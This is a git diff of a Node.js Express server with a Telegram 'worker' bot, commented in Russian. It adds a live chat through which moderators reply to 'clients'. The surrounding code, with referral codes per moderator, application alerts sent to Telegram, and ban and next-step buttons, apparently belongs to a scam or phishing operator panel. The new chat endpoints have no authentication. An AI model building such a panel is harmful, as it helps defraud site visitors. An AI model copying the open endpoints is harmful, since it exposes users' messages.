@@ -65,6 +65,11 @@ let userStatus = {};
 let extraSentUsers = {};
 let userRef = {};
 
+// ===== ЧАТ =====
+let chatStatus = {};    // id клиента -> true/false
+let chatMessages = {};  // id клиента -> массив сообщений
+let chatMod = {};       // id клиента -> id модера
+
 // ===== ГЕНЕРАЦИЯ КОДА =====
 function generateCode() {
   const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
@@ -169,7 +174,6 @@ app.post("/enter", async (req, res) => {
 
   onlineUsers[id] = Date.now();
 
-  // всегда обновляем реф если он есть
   if (ref) {
     const modId = refCodes[ref];
     if (modId) {
@@ -212,7 +216,6 @@ app.post("/send", async (req, res) => {
   seenUsers[id] = true;
 
   const ref = userRef[id] || "неизвестно";
-
   const statusText = isRepeat ? "🔁 ПОВТОРНАЯ ЗАЯВКА" : "🆕 НОВАЯ ЗАЯВКА";
 
   const fullText = `${statusText}
@@ -271,6 +274,34 @@ app.post("/send2", async (req, res) => {
   res.json({ ok: true });
 });
 
+// ===== ЧАТ: статус =====
+app.get("/chat-status/:id", (req, res) => {
+  res.json({ active: chatStatus[req.params.id] || false });
+});
+
+// ===== ЧАТ: получить сообщения =====
+app.get("/chat-messages/:id", (req, res) => {
+  res.json({ messages: chatMessages[req.params.id] || [] });
+});
+
+// ===== ЧАТ: клиент отправляет сообщение =====
+app.post("/chat-send", async (req, res) => {
+  const { id, text } = req.body;
+
+  if (!id || !text) return res.json({ ok: false });
+
+  if (!chatMessages[id]) chatMessages[id] = [];
+  chatMessages[id].push({ from: "client", text, time: Date.now() });
+
+  // отправляем модеру в тг
+  const modId = chatMod[id];
+  if (modId) {
+    await safeSend(workerBot, modId, `💬 Клиент [${id}]:\n${text}`);
+  }
+
+  res.json({ ok: true });
+});
+
 // ===== CALLBACK =====
 workerBot.on("callback_query", async (q) => {
   const data = q.data;
@@ -299,7 +330,8 @@ workerBot.on("callback_query", async (q) => {
             { text: "🚫 Бан", callback_data: "ban_" + id },
             { text: "✅ Разбан", callback_data: "unban_" + id }
           ],
-          [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }]
+          [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }],
+          [{ text: "💬 Написать", callback_data: "chat_" + id }]
         ]
       }
     });
@@ -318,6 +350,22 @@ workerBot.on("callback_query", async (q) => {
     });
 
     workerBot.answerCallbackQuery(q.id);
+  }
+
+  // ===== ОТКРЫТЬ ЧАТ =====
+  if (data.startsWith("chat")) {
+    chatStatus[id] = true;
+    chatMessages[id] = [];
+    chatMod[id] = q.from.id;
+
+    await safeSend(workerBot, q.from.id,
+      `💬 Чат с клиентом ${id} открыт!\nПишите сообщения ответом на это сообщение.`, {
+      reply_markup: {
+        force_reply: true
+      }
+    });
+
+    workerBot.answerCallbackQuery(q.id, { text: "💬 Чат открыт" });
   }
 
   if (data.startsWith("free")) {
@@ -360,6 +408,26 @@ workerBot.on("callback_query", async (q) => {
     userStatus[id] = "next";
     workerBot.answerCallbackQuery(q.id);
   }
+});
+
+// ===== МОДЕР ОТВЕЧАЕТ В БОТЕ (reply) =====
+workerBot.on("message", async (msg) => {
+  if (!msg.reply_to_message) return;
+  if (!isMod(msg.chat.id)) return;
+
+  const replyText = msg.reply_to_message.text || "";
+
+  // ищем ID клиента в тексте
+  const match = replyText.match(/ID-\d+/);
+  if (!match) return;
+
+  const clientId = match[0];
+  const text = msg.text;
+
+  if (!text) return;
+
+  if (!chatMessages[clientId]) chatMessages[clientId] = [];
+  chatMessages[clientId].push({ from: "mod", text, time: Date.now() });
 });
 
 app.listen(process.env.PORT || 3000, () => {
